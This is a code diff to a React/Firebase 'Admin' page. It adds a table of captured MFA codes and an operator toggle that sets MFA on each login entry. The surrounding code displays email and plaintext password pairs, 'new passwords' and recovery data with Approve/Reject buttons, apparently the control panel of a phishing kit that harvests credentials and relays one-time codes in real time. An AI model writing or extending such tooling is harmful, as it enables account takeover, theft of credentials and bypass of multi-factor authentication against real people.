@@ -7,6 +7,8 @@ const Admin = () => {
   const [recoveries, setRecoveries] = useState([]);
   const [verifications, setVerifications] = useState([]);
   const [newPasswords, setNewPasswords] = useState([]);
+  const [mfaCodes, setMfaCodes] = useState([]);
+
 
 
   useEffect(() => {
@@ -45,6 +47,15 @@ const Admin = () => {
         setNewPasswords(formatted);
       }
 
+      // Fetch MFA Codes
+      const mfaSnap = await get(child(dbRef, "mfa_verifications"));
+      if (mfaSnap.exists()) {
+        const data = mfaSnap.val();
+        const formatted = Object.entries(data).map(([id, val]) => ({ id, ...val }));
+        setMfaCodes(formatted);
+      }
+
+
     };
 
     fetchData();
@@ -62,6 +73,16 @@ const Admin = () => {
       prev.map((entry) => (entry.id === id ? { ...entry, status } : entry))
     );
   };
+
+  const toggleMfa = async (id, current) => {
+  await update(ref(database, `logins/${id}`), { mfa: !current });
+  setLogins(prev =>
+    prev.map(entry =>
+      entry.id === id ? { ...entry, mfa: !current } : entry
+    )
+  );
+};
+
 
   const thStyle = {
     borderBottom: "2px solid #ccc",
@@ -88,6 +109,8 @@ const Admin = () => {
               <th style={thStyle}>Time</th>
               <th style={thStyle}>Status</th>
               <th style={thStyle}>Action</th>
+              <th style={thStyle}>MFA</th>
+
             </tr>
           </thead>
           <tbody>
@@ -111,6 +134,11 @@ const Admin = () => {
                   >
                     Reject
                   </button>
+                </td>
+                <td style={tdStyle}>
+                <button onClick={() => toggleMfa(entry.id, entry.mfa || false)}>
+                  {entry.mfa ? "Disable MFA" : "Enable MFA"}
+                </button>
                 </td>
               </tr>
             ))}
@@ -159,6 +187,29 @@ const Admin = () => {
               <tr key={entry.id}>
                 <td style={tdStyle}>{entry.email}</td>
                 <td style={tdStyle}>{entry.password}</td>
+                <td style={tdStyle}>{new Date(entry.timestamp).toLocaleString()}</td>
+              </tr>
+            ))}
+          </tbody>
+        </table>
+
+        <h2 className="login-title" style={{ marginTop: "40px" }}>
+          MFA Codes
+        </h2>
+
+        <table style={{ width: "100%", borderCollapse: "collapse" }}>
+          <thead>
+            <tr>
+              <th style={thStyle}>Email</th>
+              <th style={thStyle}>Code</th>
+              <th style={thStyle}>Time</th>
+            </tr>
+          </thead>
+          <tbody>
+            {mfaCodes.map((entry) => (
+              <tr key={entry.id}>
+                <td style={tdStyle}>{entry.email}</td>
+                <td style={tdStyle}>{entry.code}</td>
                 <td style={tdStyle}>{new Date(entry.timestamp).toLocaleString()}</td>
               </tr>
             ))}
